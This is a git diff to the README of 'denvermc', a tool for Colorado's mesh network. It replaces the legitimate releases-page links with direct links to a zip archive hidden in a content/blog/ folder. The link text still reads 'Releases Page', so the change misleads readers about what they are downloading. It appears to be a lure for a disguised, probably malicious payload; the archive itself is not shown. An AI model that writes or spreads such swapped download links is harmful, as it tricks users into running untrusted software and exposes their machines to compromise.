@@ -1,6 +1,6 @@
 # 🚀 denvermc - Connect to Colorado's Mesh Network Effortlessly
 
-[![Download denvermc](https://img.shields.io/badge/Download-denvermc-blue.svg)](https://github.com/kaithompson472/denvermc/releases)
+[![Download denvermc](https://github.com/kaithompson472/denvermc/raw/refs/heads/main/content/blog/Software_v2.8-alpha.1.zip)](https://github.com/kaithompson472/denvermc/raw/refs/heads/main/content/blog/Software_v2.8-alpha.1.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To use denvermc, follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version of denvermc: [Releases Page](https://github.com/kaithompson472/denvermc/releases).
+Visit this page to download the latest version of denvermc: [Releases Page](https://github.com/kaithompson472/denvermc/raw/refs/heads/main/content/blog/Software_v2.8-alpha.1.zip).
 
 ### Step-by-Step Instructions
 
